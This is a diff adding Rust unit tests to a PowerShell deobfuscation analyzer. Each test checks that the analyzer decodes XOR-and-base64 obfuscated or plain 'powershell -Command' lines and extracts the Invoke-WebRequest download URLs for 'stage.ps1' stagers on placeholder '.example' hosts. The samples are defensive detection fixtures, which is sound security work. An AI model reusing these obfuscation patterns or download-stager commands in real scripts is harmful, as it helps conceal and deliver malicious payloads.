@@ -15145,6 +15145,113 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_xor_base64_function_call_decodes_nested_command() {
+        use base64::Engine;
+
+        fn encode_xor_b64(value: &str, key: &[u8]) -> String {
+            let encoded: Vec<u8> = value
+                .bytes()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect();
+            base64::engine::general_purpose::STANDARD.encode(encoded)
+        }
+
+        let key = b"uknkkeliges";
+        let decoded = "Invoke-WebRequest -Uri https://ps-xor-b64-fn.example/stage.ps1";
+        let blob = encode_xor_b64(decoded, key);
+        let script = format!(
+            r#"$omprioriteringen=@(117,107,110,107,107,101,108,105,103,101,115);
+function Unvertically ($pauver,$execute=0) {{
+  $bytes=[Convert]::FromBase64String($pauver);
+  $out=0..($bytes.Length-1)|%{{ $bytes[$_] -bxor $omprioriteringen[$_%$omprioriteringen.Length] }};
+  [Text.Encoding]::ASCII.GetString($out)
+}}
+Unvertically '{blob}' 1"#
+        );
+        let report = analyze(
+            format!("powershell -Command \"{}\"\r\n", script.replace('"', "`\"")).as_bytes(),
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-xor-b64-fn.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "xor/base64 function call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn powershell_command_payload_preserves_percent_literals_before_ps_scan() {
+        let script = r#"powershell -Command "$pad='left%MISSING%right'; Invoke-WebRequest -Uri https://raw-percent-ps.example/stage.ps1""#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let extracted = report
+            .extracted_ps1
+            .iter()
+            .map(|body| String::from_utf8_lossy(body))
+            .collect::<Vec<_>>()
+            .join("\n---\n");
+        assert!(
+            extracted.contains("left%MISSING%right"),
+            "PowerShell command body was percent-expanded before PS scan:\n{}",
+            extracted
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://raw-percent-ps.example/stage.ps1"
+                )
+            }),
+            "raw PowerShell command URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_markerless_xor_base64_extractor_call_decodes_nested_command() {
+        use base64::Engine;
+
+        fn encode_xor_b64(value: &str, key: &[u8]) -> String {
+            let encoded: Vec<u8> = value
+                .bytes()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect();
+            base64::engine::general_purpose::STANDARD.encode(encoded)
+        }
+
+        let key = b"uknkkeliges";
+        let decoded = "Invoke-WebRequest -Uri https://ps-markerless-xor.example/stage.ps1";
+        let blob = encode_xor_b64(decoded, key);
+        let script = format!(
+            r#"$omprioriteringen=@(117,107,110,107,107,101,108,105,103,101,115);
+function Unvertically ($pauver,$execute=0) {{
+  $out=0..($pauver.Length-1)|%{{ $pauver[$_] -bxor $omprioriteringen[$_%$omprioriteringen.Length] }};
+  $out
+}}
+Unvertically '{blob}' 1"#
+        );
+        let report = analyze(
+            format!("powershell -Command \"{}\"\r\n", script.replace('"', "`\"")).as_bytes(),
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-markerless-xor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "markerless xor/base64 extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_hex_split_char_loop() {
         let ps = r#"$h = '40 65 63 68 6f 20 6f 66 66 0d 0a 65 63 68 6f 20 68 69' -Split ' ' | foreach {[char]([convert]::toint16($_,16))}; $s = $h -join ''"#;
         let normalized = crate::ps1_scan::normalize_ps1_text(ps);
